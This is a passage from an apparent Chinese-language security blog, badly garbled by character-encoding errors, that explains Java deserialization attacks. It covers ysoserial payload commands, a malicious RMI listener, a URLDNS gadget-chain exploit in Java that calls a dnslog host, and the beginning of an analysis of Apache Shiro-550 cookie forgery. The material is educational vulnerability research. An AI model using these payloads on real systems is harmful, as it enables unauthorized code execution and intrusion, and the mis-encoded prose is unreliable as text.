ObjectInputStreamç”¨äºæ¢å¤å…ˆå‰åºåˆ—åŒ–çš„å¯¹è±¡. å…¶ä»–ç”¨é€”åŒ…æ‹¬ä½¿ç”¨å¥—æ¥å­—æµåœ¨ä¸»æœºä¹‹é—´ä¼ é€’å¯¹è±¡,æˆ–è€…åœ¨è¿œç¨‹é€šä¿¡ç³»ç»Ÿä¸­è¿›è¡Œå°é€å’Œè§£ç»„å‚æ•°å’Œå‚æ•°. * ObjectInputStreamç¡®ä¿ä»æµä¸­åˆ›å»ºçš„å›¾ä¸­çš„æ‰€æœ‰å¯¹è±¡çš„ç±»å‹ä¸Javaè™šæ‹Ÿæœºä¸­å­˜åœ¨çš„ç±»åŒ¹é…. æ ¹æ®éœ€è¦ä½¿ç”¨æ ‡å‡†æœºåˆ¶åŠ è½½ç±». * åªèƒ½ä»æµä¸­è¯»å–æ”¯æŒjava.io.Serializableæˆ–java.io.Externalizableæ¥å£çš„å¯¹è±¡. */ // ååºåˆ—åŒ–çš„ç±» ObjectInputStream ois = new ObjectInputStream((new FileInputStream(&quot;ser.ser&quot;))); /* * æ–¹æ³•readObjectç”¨äºä»æµä¸­è¯»å–å¯¹è±¡. åº”ä½¿ç”¨Javaçš„å®‰å…¨é“¸é€ æ¥è·å¾—æ‰€éœ€çš„ç±»å‹. åœ¨Javaä¸­,å­—ç¬¦ä¸²å’Œæ•°ç»„æ˜¯å¯¹è±¡,åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­è¢«è§†ä¸ºå¯¹è±¡. * è¯»å–æ—¶,éœ€è¦å°†å…¶è½¬æ¢ä¸ºé¢„æœŸç±»å‹. */ // è¯»å‡ºæ¥å¹¶ååºåˆ—åŒ– Person person = (Person) ois.readObject(); System.out.println(person); ois.close(); }} æ‰§è¡Œï¼Œå¼¹å‡ºæ¥äº†è®¡ç®—å™¨ï¼Œï¼Œï¼Œ åŒæ—¶ï¼Œæˆ‘ä»¬unserialize.javaé‡Œï¼Œ Person person = (Person) ois.readObject(); æˆåŠŸè®²unserialize.javaé‡Œçš„ å®ä¾‹åŒ–çš„personå¯¹è±¡æ¥æ”¶äº†è¿‡æ¥ã€‚ (5) serialVersionUIDè®²è§£åºåˆ—åŒ–å’Œååºåˆ—åŒ–å¯ä»¥ç†è§£ä¸ºå‹ç¼©å’Œè§£å‹ç¼©,ä½†æ˜¯å‹ç¼©ä¹‹æ‰€ä»¥èƒ½è¢«è§£å‹ç¼©çš„å‰ææ˜¯å› ä¸ºä»–ä¿©çš„åè®®æ˜¯ä¸€æ ·çš„.å¦‚æœå‹ç¼©æ˜¯ä»¥å››ä¸ªå­—èŠ‚ä¸ºä¸€ä¸ªå•ä½,è€Œè§£å‹ç¼©ä»¥å…«ä¸ªå­—èŠ‚ä¸ºä¸€ä¸ªå•ä½,å°±ä¼šä¹±å¥— åŒæ ·åœ¨Javaä¸­ä¸åè®®ç›¸å¯¹çš„æ¦‚å¿µä¸º:serialVersionUID å½“serialVersionUIDä¸ä¸€è‡´æ—¶,ååºåˆ—åŒ–ä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸ æ¯”å¦‚è®¾ç½®ä¸º2Læ—¶åºåˆ—åŒ–,ä¿®æ”¹ä¸º1Læ—¶ååºåˆ—åŒ–,åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸ &lt;3&gt; javaååºåˆ—åŒ–åˆ©ç”¨(ysoserial)Javaååºåˆ—åŒ–å’Œphpç›¸åŒçš„æ˜¯ï¼Œphpååºåˆ—åŒ–é€šè¿‡POPé“¾æœ€ç»ˆè¦æ‰¾åˆ°ä¸€ä¸ªè½è„šç‚¹ï¼ˆRCEï¼‰ï¼Œè¿™ä¸ªè½è„šç‚¹ä¸€èˆ¬éƒ½æ˜¯å¼€å‘è‡ªå·±å†™çš„ã€‚javaé€šè¿‡gadgetä¹Ÿè¦æ‰¾ä¸€ä¸ªè½è„šç‚¹ï¼Œè€Œè¿™ä¸ªè½è„šç‚¹åœ¨javaæ ‡å‡†åº“å’Œä¸€äº›å¸¸ç”¨åº“å°±æœ‰ ysoserialä¸Šå°±é›†æˆäº†å„ç§å¸¸ç”¨gadgetï¼Œå…¶ä¸­æœ€ç®€å•çš„å°±æ˜¯URLDNS å·¥å…·ä¸‹è½½åœ°å€ï¼šhttps://github.com/frohoff/ysoserialç”¨æ³•ï¼šjava -jar ysoserial.jar å°±å¯ä»¥çœ‹åˆ°æœ‰å“ªäº›gadgetï¼Œå®ƒä»¬é€‚åˆçš„æ‰©å±•åº“æˆ–è€…JDKç‰ˆæœ¬ å‡è®¾ä¸Šé¢æ¼”ç¤ºç”Ÿæˆçš„ ser.serè¿™ä¸ªæ–‡ä»¶è·¯å¾„æˆ‘ä»¬å¯æ§ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ å‡ºä¸€ä¸ªæ¶æ„ååºåˆ—åŒ–æ–‡ä»¶ï¼Œæ¥è¿›è¡ŒDNSæŸ¥è¯¢ å»DNSlogç”³è¯·ä¸€ä¸ªåŸŸåï¼šhttp://dnslog.cn/java -jar ysoserial.jar URLDNS &quot;http://1bvloh.dnslog.cn&quot; &gt; ser.ser ç„¶åæ›¿æ¢æ‰ser.serï¼Œæ‰§è¡Œ 12345678910111213import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;public class unserialize { public static void main(String[] args) throws IOException, ClassNotFoundException { // ååºåˆ—åŒ–çš„ç±» ObjectInputStream ois = new ObjectInputStream((new FileInputStream(&quot;ser.ser&quot;))); // è¯»å‡ºæ¥å¹¶ååºåˆ—åŒ– ois.readObject(); ois.close(); }} ç»å¤§éƒ¨åˆ†ååºåˆ—åŒ–æ¼æ´éƒ½æ˜¯è¿™æ ·ç”Ÿæˆpayloadå¹¶åˆ©ç”¨çš„ï¼Œåªä¸è¿‡ser.serå¯èƒ½éœ€è¦ç»è¿‡å¤æ‚ç¼–ç ï¼Œæˆ–è€…è—åœ¨RMIæœåŠ¡ä¸­ä½¿ç”¨ã€‚ æ¯”å¦‚ï¼šæ›´å¸¸ç”¨çš„CommonsCollections4ã€‚java -jar ysoserial.jar CommonsCollections4 &quot;ping dnslog.cn&quot;èµ·ä¸€ä¸ªæ¶æ„RMIæœåŠ¡ï¼Œä¸€æ—¦æœ‰äººè¿æ¥å®ƒï¼Œå°±å‘é€æ¶æ„ååºåˆ—åŒ–å­—èŠ‚çš„payloadjava -cp ysoserial.jar ysoserial.exploit.JRMPListener 5555 CommonsCollections4 &quot; ping dnslog.cn &quot;æ¥ä¸‹æˆ‘ä»¬é€šè¿‡å¯¹URLDNSçš„åˆ†ææ¥äº†è§£å…·ä½“æ˜¯å¦‚ä½•é€ æˆå±å®³çš„ &lt;4&gt; URLDNSé“¾åˆ†æ URLDNSé“¾æ˜¯javaåŸç”Ÿæ€çš„ä¸€æ¡åˆ©ç”¨é“¾, é€šå¸¸ç”¨äºå­˜åœ¨ååºåˆ—åŒ–æ¼æ´è¿›è¡ŒéªŒè¯çš„,å› ä¸ºæ˜¯åŸç”Ÿæ€,ä¸å­˜åœ¨ä»€ä¹ˆç‰ˆæœ¬é™åˆ¶.HashMapç»“åˆURLè§¦å‘DNSæ£€æŸ¥çš„æ€è·¯.åœ¨å®é™…è¿‡ç¨‹ä¸­å¯ä»¥é¦–å…ˆé€šè¿‡è¿™ä¸ªå»åˆ¤æ–­æœåŠ¡å™¨æ˜¯å¦ä½¿ç”¨äº†readObject()ä»¥åŠèƒ½å¦æ‰§è¡Œ.ä¹‹åå†ç”¨å„ç§gadgetå»å°è¯•RCE.HashMapæœ€æ—©å‡ºç°åœ¨JDK 1.2ä¸­, åº•å±‚åŸºäºæ•£åˆ—ç®—æ³•å®ç°.è€Œæ­£æ˜¯å› ä¸ºåœ¨HashMapä¸­,Entryçš„å­˜æ”¾ä½ç½®æ˜¯æ ¹æ®Keyçš„Hashå€¼æ¥è®¡ç®—,ç„¶åå­˜æ”¾åˆ°æ•°ç»„ä¸­çš„.æ‰€ä»¥å¯¹äºåŒä¸€ä¸ªKey, åœ¨ä¸åŒçš„JVMå®ç°ä¸­è®¡ç®—å¾—å‡ºçš„Hashå€¼å¯èƒ½æ˜¯ä¸åŒçš„.å› æ­¤,HashMapå®ç°äº†è‡ªå·±çš„writeObjectå’ŒreadObjectæ–¹æ³• é“¾å­åˆ©ç”¨æ€è·¯ï¼š é¦–å…ˆæ‰¾åˆ°Sink:å‘èµ·DNSè¯·æ±‚çš„URLç±»hashCodeæ–¹æ³• çœ‹è°èƒ½è°ƒç”¨URLç±»çš„hashCodeæ–¹æ³•(æ‰¾gadget),å‘ç°HashMapè¡Œ(ä»–é‡å†™äº†hashCodeæ–¹æ³•,æ‰§è¡Œäº†Mapé‡Œé¢keyçš„hashCodeæ–¹æ³•,HashMapè€Œkeyçš„ç±»å‹å¯ä»¥æ˜¯URLç±»),è€Œä¸”HashMapçš„readObjectæ–¹æ³•ç›´æ¥è°ƒç”¨äº†hashCodeæ–¹æ³• EXPçš„æ€è·¯å°±æ˜¯åˆ›å»ºä¸€ä¸ªHashMap,å¾€é‡Œé¢ä¸¢ä¸€ä¸ªURLå½“key,ç„¶ååºåˆ—åŒ–å®ƒ åœ¨ååºåˆ—åŒ–çš„æ—¶å€™è‡ªç„¶å°±ä¼šæ‰§è¡ŒHashMapçš„readObject-&gt;hashCode-&gt;URLçš„hashCode-&gt;DNSè¯·æ±‚ Hashmapç±»å¯¹äºHashMapè¿™ä¸ªç±»æ¥è¯´,ä»–é‡è½½äº†readObjectå‡½æ•°ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œè€Œåœ¨æœåŠ¡ç«¯å¯¹åºåˆ—åŒ–æ•°æ®è¿›è¡Œååºåˆ—åŒ–æ—¶,ä¼šè°ƒç”¨è¢«åºåˆ—åŒ–å¯¹è±¡çš„readObject()æ–¹æ³•ã€‚ è¿™é‡Œå…ˆçœ‹çœ‹åœ¨é‡è½½çš„é€»è¾‘ä¸­,çœ‹çœ‹æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹ã€‚ è·Ÿè¿› æŸ¥çœ‹ä¸€ä¸‹readObjectæ–¹æ³•: æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒé‡æ–°è®¡ç®—äº†keyçš„Hash å†æ¬¡è·Ÿè¿›hashå‡½æ•°,æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå®ƒè°ƒç”¨äº†keyçš„hashcodeå‡½æ•°ï¼Œå› æ­¤ï¼Œå¦‚æœè¦æ„é€ ä¸€æ¡ååºåˆ—åŒ–é“¾æ¡ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°å®ç°äº†hashcodeå‡½æ•°ä¸”ä¼ å‚å¯æ§ï¼Œå¹¶ä¸”å¯è¢«æˆ‘ä»¬åˆ©ç”¨çš„ç±» è€Œå¯ä»¥è¢«æˆ‘ä»¬åˆ©ç”¨çš„ç±»å°±æ˜¯ä¸‹é¢çš„URLDNS URLDNSç±»æŸ¥çœ‹ä¸€ä¸‹URLç±»çš„hashCode()å‡½æ•°ã€‚å‘ç°å½“hashCodeä¸æ˜¯-1ï¼Œåˆ™ä¼šè°ƒç”¨URLStreamHandleræŠ½è±¡ç±»çš„hashCode()å‡½æ•°ã€‚è¿™æ˜¾ç„¶æ˜¯ä¸ºäº†åªç®—ä¸€æ¬¡hashï¼Œè€Œhandleræ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ æ‰¾åˆ°URLStreamHandlerè¿™ä¸ªæŠ½è±¡ç±»,æŸ¥çœ‹å®ƒçš„hashcodeå®ç°,è°ƒç”¨äº†getHostAddresså‡½æ•°,ä¼ å‚å¯æ§ è·Ÿè¿› æŸ¥çœ‹getHostAddresså‡½æ•°,å¯ä»¥å‘ç°å®ƒè¿›è¡Œäº†DNSæŸ¥è¯¢,å°†åŸŸåè½¬æ¢ä¸ºå®é™…çš„IPåœ°å€ã€‚å‚æ•°uæ˜¯this ä¹Ÿå°±æ˜¯URLå¯¹è±¡ åˆ°è¿™äº†ï¼Œæˆ‘ä»¬ä¹Ÿå°±ä¸ç”¨ç»§ç»­å¾€ä¸‹è·Ÿè¿›äº†ã€‚ URLç±»çš„hashCode()æ–¹æ³•å¯ä»¥è¿›è¡ŒDNSæŸ¥è¯¢ï¼Œè€ŒHashmapç±» é‡å†™çš„readObjectæ–¹æ³•å¯ä»¥è°ƒç”¨ key.hashCode()ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡Hashmapçš„putæ–¹æ³•æ§åˆ¶keyä¸ºURLç±» æ„é€ hashmapå¯¹è±¡åºåˆ—åŒ–ï¼Œè¿™æ ·ååºåˆ—åŒ–çš„æ—¶å€™å°±å¯ä»¥å®ç°DNSæŸ¥è¯¢ã€‚ 1234567891011 public V put(K key, V value) { return putVal(hash(key), key, value, false, true); }putValæ–¹æ³•æ˜¯è®°å½•é”®å€¼å¯¹çš„æ–¹æ³•ï¼Œè¿‡ç¨‹æ˜¯putVal()â€”â€”newNode()â€”â€”Node() Node(int hash, K key, V value, Node&lt;K,V&gt; next) { this.hash = hash; this.key = key; this.value = value; this.next = next; } é“¾å­å¦‚ä¸‹ï¼šHashMap.readObject()-&gt;HashMap.hash()-&gt;URL.hashCode()-&gt;URLStreamHandler.hashCode()-&gt;URLStreamHandler.getHostAddress() æ¼æ´åˆ©ç”¨ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637package urldns;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.net.URL;import java.util.HashMap;public class Dnstest { public static void main(String[] args) throws Exception { HashMap&lt;URL, Integer&gt; hashmap = new HashMap&lt;URL, Integer&gt;(); URL url = new URL(&quot;http://w4qyn9.dnslog.cn&quot;); Class c =URL.class; Field fieldHashcode = c.getDeclaredField(&quot;hashCode&quot;); fieldHashcode.setAccessible(true); // å‘ç°åœ¨ç”Ÿæˆè¿‡ç¨‹ä¸­,dnslogå°±æ”¶åˆ°äº†è¯·æ±‚,å¹¶ä¸”åœ¨ååºåˆ—è¿‡ç¨‹ådnslogä¸åœ¨æ”¶åˆ°æ–°çš„è¯·æ±‚,è¿™æ˜¾ç„¶ä¸ç¬¦åˆæˆ‘ä»¬çš„æœŸæœ› // åŸå› æ˜¯åœ¨putçš„è¿‡ç¨‹ä¸­hashMapç±»å°±è°ƒç”¨äº†hashæ–¹æ³•,å¹¶ä¸”åœ¨hashæ–¹æ³•ä¸­åˆ¤æ–­hashcodeä¸ä¸ºåˆå§‹åŒ–çš„å€¼(-1)æ—¶ä¼šç›´æ¥ // è¿”å›,ç”±äºåœ¨åºåˆ—åŒ–çš„æ—¶å€™å·²ç»è¿›è¡Œäº†hashCodeè®¡ç®—,é‚£ä¹ˆåœ¨ååºåˆ—åŒ–æ—¶hashCodeå€¼å°±ä¸æ˜¯-1äº†ã€‚å°±ä¸ä¼šèµ°åˆ°ä»–çœŸæ­£çš„handler.hashCodeæ–¹æ³•é‡Œ // æ‰€ä»¥åœ¨hashmap.put()å‰ éœ€è¦ä¿®æ”¹URLç±»hashCodeå€¼ä¸ä¸º-1 fieldHashcode.set(url,1); hashmap.put(url, 22); // ååºåˆ—åŒ–ä¹‹åè¿˜æ˜¯éœ€è¦è®©ä»–å‘é€è¯·æ±‚,æ‰€ä»¥éœ€è¦æ”¹å›æ¥ // è¿™æ˜¯ä¸ºäº†é˜²æ­¢æˆ‘ä»¬æŠŠputçš„æ—¶å€™å‘é€çš„DNSè¯·æ±‚è¯¯ä»¥ä¸ºæ˜¯ååºåˆ—åŒ–æ—¶çš„readObjectå»å‘çš„DNSè¯·æ±‚ fieldHashcode.set(url,-1); Serializable(hashmap); //Unserializable(hashmap); } public static void Serializable(Object obj) throws Exception { ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.ser&quot;)); objectOutputStream.writeObject(obj); objectOutputStream.close(); }} ç”Ÿæˆser.seræ–‡ä»¶ä¹‹å ååºåˆ—åŒ–è°ƒç”¨ 123456789101112131415package urldns;import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;public class test { public static void main(String[] args) throws ClassNotFoundException, IOException { // ååºåˆ—åŒ–çš„ç±» ObjectInputStream ois = new ObjectInputStream((new FileInputStream(&quot;ser.ser&quot;))); // è¯»å‡ºæ¥å¹¶ååºåˆ—åŒ– ois.readObject(); ois.close(); }} åœ¨ dnslog.cn å¤„æˆåŠŸæ”¶åˆ°å“åº” ä¸ºä»€ä¹ˆ newå‡ºæ¥äº†URLç±»å®ä¾‹urlï¼Œè¿˜éœ€è¦ç”¨åå°„æœºåˆ¶å‘¢ï¼Ÿå› ä¸ºåå°„æ›´çµæ´» URLç±»é‡Œ hashCodeæ˜¯privateå±æ€§ï¼Œæ— æ³•ç›´æ¥è®¾ç½®ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡åå°„æ¥è®¾ç½®ã€‚ é€šè¿‡åå°„çš„æ–¹å¼ï¼Œå…ˆå°†urlå¯¹è±¡çš„hashCodeè®¾ç½®ä¸º1ï¼Œè¿™æ ·åœ¨hashmap.put(url,22)çš„æ—¶å€™å¯ä»¥è·³è¿‡DNSæŸ¥è¯¢ï¼Œput URLå’Œ22 urlå®ä¾‹èµ‹ç»™äº†hashmapçš„keyï¼Œå†é€šè¿‡åå°„å°†urlå¯¹è±¡çš„hashCodeè®¾ç½®ä¸º-1ï¼Œç„¶åè®²hashmapå¯¹è±¡åºåˆ—åŒ–å†™å…¥äºŒè¿›åˆ¶æ–‡ä»¶ser.serï¼Œæœ€ç»ˆååºåˆ—åŒ–çš„æ—¶å€™è¿›è¡Œäº†DNSæŸ¥è¯¢ æ³¨ï¼šhashmapçš„keyå’Œ urlå¯¹è±¡æŒ‡å‘çš„æ˜¯åŒä¸€å¯¹è±¡ï¼Œå› æ­¤æˆ‘ä»¬åé¢å†é€šè¿‡åå°„å°†urlå¯¹è±¡çš„hashCodeè®¾ç½®ä¸º-1æ—¶ï¼Œhashmapé‡Œkey(URLå¯¹è±¡)çš„hashCodeä¹Ÿä¼šå˜æˆ-1. å‚è€ƒï¼šhttps://mp.weixin.qq.com/s/TCgHuK2qLIVRxnc6_mqx_Qhttps://mp.weixin.qq.com/s/t81n92VPzqy6liEYOAgzNw","link":"/2023/03/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2-URLDNS%E9%93%BE/"},{"title":"Javaååºåˆ—åŒ–Shiroç¯‡01-Shiro550ååºåˆ—åŒ–æ¼æ´åˆ†æ","text":"&lt;1&gt; Shiroä»‹ç»Apache Shiro æ˜¯ä¸€ä¸ªå¼€æºå®‰å…¨æ¡†æ¶ï¼Œæä¾›èº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å­¦å’Œä¼šè¯ç®¡ç† Shiroååºåˆ—åŒ–åŸç†ï¼šApache Shiroæ¡†æ¶æä¾›äº† RememberMe åŠŸèƒ½ï¼Œç”¨æˆ·ç™»é™†æˆåŠŸåä¼šç”Ÿæˆç»è¿‡åŠ å¯†å¹¶ç¼–ç çš„cookieï¼Œåœ¨æœåŠ¡ç«¯æ¥æ”¶cookieå€¼åï¼ŒBase64è§£ç â€“&gt;AESè§£å¯†â€“&gt;ååºåˆ—åŒ–ã€‚å› æ­¤æ”»å‡»è€…åªè¦æ‰¾åˆ°AESåŠ å¯†çš„å¯†é’¥ï¼Œå°±å¯ä»¥æ„é€ ä¸€ä¸ªæ¶æ„å¯¹è±¡ï¼Œå¯¹å…¶è¿›è¡Œåºåˆ—åŒ–â€“&gt;AESåŠ å¯†â€“&gt;Base64ç¼–ç ï¼Œç„¶åå°†å…¶ä½œä¸ºcookieçš„rememberMeå­—æ®µå‘é€ï¼ŒShiroå°†rememberMeè¿›è¡Œè§£å¯†å¹¶ä¸”ååºåˆ—åŒ–ï¼Œæœ€ç»ˆé€ æˆååºåˆ—åŒ–æ¼æ´ åœ¨ Apache Shiro&lt;=1.2.4 ç‰ˆæœ¬ä¸­ AES åŠ å¯†æ—¶é‡‡ç”¨çš„ key æ˜¯ç¡¬ç¼–ç åœ¨ä»£ç ä¸­çš„ï¼Œè¿™å°±ä¸ºä¼ªé€  cookie æä¾›äº†æœºä¼šã€‚åªè¦ rememberMe çš„ AES åŠ å¯†å¯†é’¥æ³„éœ²ï¼Œæ— è®º shiro æ˜¯ä»€ä¹ˆç‰ˆæœ¬éƒ½ä¼šå¯¼è‡´ååºåˆ—åŒ–æ¼æ´ &lt;2&gt; ç¯å¢ƒé…ç½®shiroæºç ä¸‹è½½ï¼šhttps://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4waråŒ…åœ°å€ï¼šhttps://github.com/jas502n/SHIRO-550 jdk8u65 Tomcat 9 Shiro 1.2.4 é…ç½®tomcatï¼š tomcatçš„ç«¯å£é…ç½®æˆ 8081 è¿™æ ·åé¢ç”¨burpæŠ“åŒ…æ—¶å°±ä¸ä¼šå†²çª å¯åŠ¨tomcat ç™»å½•çš„ username å’Œ password æ˜¯ root ä¸ secret æˆ‘ä»¬ç™»å½•æ—¶é€‰æ‹© Remember me æŠ“åŒ… å‹¾é€‰ RememberMe å­—æ®µï¼Œç™»é™†æˆåŠŸçš„è¯ï¼Œè¿”å›åŒ… set-Cookie ä¼šæœ‰ rememberMe=deleteMe å­—æ®µï¼Œè¿˜ä¼šæœ‰ rememberMe å­—æ®µï¼Œä¹‹åçš„æ‰€æœ‰è¯·æ±‚ä¸­ Cookie éƒ½ä¼šæœ‰ rememberMe å­—æ®µ &lt;3&gt; æ¼æ´åˆ†ææˆ‘ä»¬åœ¨æ‹¿åˆ°è¿™ä¸€ Cookie çš„æ—¶å€™ï¼Œå¾ˆæ˜æ˜¾èƒ½å¤Ÿçœ‹åˆ°è¿™æ˜¯ç»è¿‡æŸç§åŠ å¯†çš„ã€‚å› ä¸ºæˆ‘ä»¬å¹³å¸¸çš„ Cookie éƒ½æ˜¯æ¯”è¾ƒçŸ­çš„ï¼Œè€Œ shiro RememberMe å­—æ®µçš„ Cookie å¤ªé•¿äº† æˆ‘ä»¬è·Ÿè¿›å»ç›¸å…³ä½ç½®å»çœ‹çœ‹Cookieçš„åŠ å¯†è¿‡ç¨‹åœ¨IDEAé‡Œ å…¨å±€æœç´¢ Cookie shiroåŠ å¯†è¿‡ç¨‹åˆ†æå…¥å£æ˜¯åœ¨ AbstractRememberMeManager.onSuccessfulLogin æ–¹æ³• è¿™é‡Œæˆ‘ä»¬æ­£å‘åˆ†æä¸€ä¸‹ï¼Œdebugæ‰“ä¸ªæ–­ç‚¹ï¼Œç„¶åwebç™»å½•é¡µé¢è¾“å…¥root/secret å£ä»¤è¿›è¡Œæäº¤ï¼Œå†å›åˆ°IDEAä¸­æŸ¥çœ‹ è¿™é‡Œä¼šç»ä¸€ä¸ª isRememberMe(token) çš„åˆ¤æ–­ å³åˆ¤æ–­cookieé‡Œæ˜¯å¦å­˜åœ¨rememberMeå­—æ®µï¼ŒTrueçš„è¯ è°ƒç”¨rememberIdentity()æ–¹æ³• F7 æ­¥å…¥ rememberIdentity() æ–¹æ³•ï¼Œè¿™é‡Œç»§ç»­è°ƒç”¨getIdentityToRemember()ï¼Œä½œç”¨å°±æ˜¯è·å–ç”¨æˆ·åèµ‹å€¼ç»™ principals å†å›åˆ° rememberIdentity() æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›this.rememberIdentity(subject, principals) è¿›å…¥ convertPrincipalsToBytes() æ–¹æ³•ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªæ–¹æ³• å®ƒå…ˆå¯¹ç”¨æˆ·åè¿›è¡Œåºåˆ—åŒ–å¤„ç†ï¼Œç„¶åè°ƒç”¨this.getCipherService()æ–¹æ³•æ˜¯å¦æœ‰è¿”å›å€¼ï¼Œå­˜åœ¨çš„è¯ï¼Œå°±è°ƒç”¨ encrypt() æ–¹æ³•è¿›è¡ŒåŠ å¯† è·Ÿè¿› çœ‹ä¸€ä¸‹åºåˆ—åŒ–çš„ä»£ç ï¼š å†è·Ÿè¿›çœ‹ä¸€ä¸‹ encrypt() æ–¹æ³• è°ƒç”¨äº† this.getCipherService()æ–¹æ³• è¿”å›äº†ä¸€ç§ AES çš„åŠ å¯†æ–¹å¼CBC æ‰€ä»¥encryptåº”è¯¥ç”¨çš„æ˜¯AESåŠ å¯†ç®—æ³• AES æ˜¯ä¸€ç§å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œæœ‰å¯†é’¥ å†æ¬¡è·Ÿè¿› getEncryptionCipherKey() çœ‹ä¸€ä¸‹AESåŠ å¯†çš„å¯†é’¥æ˜¯æ€ä¹ˆç”Ÿæˆçš„ ä¸€æ­¥æ­¥å¾€ä¸Šæ‰¾ å†æ‰¾ä¸€ä¸‹å“ªé‡Œå®šä¹‰çš„ encryptionCipherKey å†å¾€ä¸Šæ‰¾å“ªé‡Œè°ƒç”¨äº† setEncryptionCipherKey()æ–¹æ³•ï¼Œæ‰¾åˆ°äº†setCipherkey()æ–¹æ³• AESåŠ è§£å¯†ç”¨çš„å¯†é’¥æ˜¯ä¸€æ ·çš„ æœ€ç»ˆä»æ„é€ å‡½æ•°è¿™é‡Œæ‰¾åˆ°äº†è®¾ç½®å¯†é’¥çš„åœ°æ–¹ è¿™é‡Œä¼ å…¥çš„é™æ€å˜é‡DEFAULT_CIPHER_KEY_BYTES æ˜¯åœ¨ç±»å®šä¹‰é‡Œé¢å†™å¥½çš„å¸¸é‡ base64è§£å¯†å³å¯å¾—åˆ°å¯†é’¥ åç»­åŠ å¯†ï¼Œä¼šå¯¹åºåˆ—åŒ–å­—èŠ‚æµå’Œå¯†é’¥å¸¸é‡ä¼ å…¥ cipherService.encrypt è¿›è¡ŒAESåŠ å¯† è¿”å›åŠ å¯†çš„åºåˆ—åŒ–å­—èŠ‚æµ åˆ°rememberIdentity()æ–¹æ³•ä¸‹ä¸€æ­¥è°ƒç”¨rememberSerializedIdentity()æ–¹æ³•ï¼š è¿›è¡Œbase64åŠ å¯†ä¹‹åï¼Œå­˜å‚¨åˆ°Cookieé‡Œ å°±å¾—åˆ°äº†æˆ‘ä»¬çš„rememberMeå­—æ®µ è¿™å°±æ˜¯æˆ‘ä»¬å‰é¢å‹¾é€‰remembermeçš„è¯ï¼ŒrememberMeå­—æ®µçš„ç”±æ¥ shiroè§£å¯†è¿‡ç¨‹ç”±äºæˆ‘ä»¬å¹¶ä¸çŸ¥é“å“ªä¸ªæ–¹æ³•é‡Œé¢å»å®ç°è¿™ä¹ˆä¸€ä¸ªåŠŸèƒ½ã€‚ä½†æ˜¯æˆ‘ä»¬å‰é¢åˆ†æåŠ å¯†çš„æ—¶å€™ï¼Œè°ƒç”¨äº†AbstractRememberMeManager.encrypt()è¿›è¡ŒåŠ å¯†ï¼Œè¯¥ç±»ä¸­ä¹Ÿæœ‰å¯¹åº”çš„decryptã€‚é‚£ä¹ˆåœ¨è¿™é‡Œå°±å¯ä»¥ç”¨æ¥æŸ¥çœ‹è¯¥æ–¹æ³•å…·ä½“ä¼šåœ¨å“ªé‡Œè¢«è°ƒç”¨åˆ°ï¼Œå°±å¯ä»¥è¿½æº¯åˆ°ä¸Šå±‚å»ï¼Œç„¶åè¿›è¡Œä¸‹æ–­ç‚¹ è¿½æº¯åˆ° AbstractRememberMeManager.convertBytesToPrincipals() å†è¿½æº¯ä¸€ä¸‹å“ªé‡Œè°ƒç”¨äº† convertBytesToPrincipals()æ–¹æ³• è¿½æº¯åˆ°äº† AbstractRememberMeManager.getRememberedPrincipals ä»DefaultSecurityManager.getRememberedIdentity()å¼€å§‹åˆ†æ è·Ÿè¿› getRememberedPrincipals()æ–¹æ³• è°ƒç”¨äº† getRememberedSerializedIdentity() æ–¹æ³• è·Ÿè¿›é‡ç‚¹çœ‹æ­¤æ–¹æ³• ä¸»è¦åŠŸèƒ½ä¸ºï¼šè·å–cookieä¸­çš„rememberMeå­—æ®µï¼Œåˆ¤æ–­å€¼æ˜¯å¦å’ŒDELETED_COOKIE_VALUEä¸€è‡´ å³ deletemeä¸ä¸€è‡´çš„è¯ï¼Œåˆ™ä¼šå†æ¬¡åˆ¤æ–­æ˜¯å¦æ˜¯ç¬¦åˆbase64çš„ç¼–ç é•¿åº¦ï¼Œç„¶åå†å¯¹å…¶è¿›è¡Œbase64è§£ç ï¼Œå°†è§£ç ç»“æœè¿”å›èµ‹å€¼ç»™bytes ç„¶åå›åˆ°getRememberedPrincipals()æ–¹æ³•ï¼Œbytesä¸ä¸ºnullï¼Œå› æ­¤è°ƒç”¨ convertBytesToPrincipals()æ–¹æ³• è°ƒç”¨decryptè¿›è¡Œè§£å¯†ï¼Œç„¶åè¿”å› deserialize(bytes); decryptå‡½æ•°å³ä¸ºä¹‹å‰AESåŠ å¯†é€†è¿‡ç¨‹ã€AESè§£å¯†å‡½æ•° ä¸å†ç»§ç»­è¯¦ç»†è·Ÿè¿›æŸ¥çœ‹ è·Ÿè¿› deserialize()æ–¹æ³• è¿™é‡Œä¼šè°ƒç”¨ getSerializer().deserialize() å¯¹æˆ‘ä»¬ base64è§£å¯†-AESè§£å¯†åçš„rememberMeçš„å€¼è¿›è¡Œååºåˆ—åŒ– è·Ÿè¿›æ­¤å‡½æ•°ï¼Œçœ‹ä¸€ä¸‹deserialize()å‡½æ•°çš„å®ç°ï¼Œè°ƒç”¨çš„æ˜¯DefaultSerializer.deserialize() è°ƒç”¨äº†readObject()å‡½æ•°ï¼Œå¹¶ä¸”å‰é¢æˆ‘ä»¬å¾—çŸ¥ åŠ 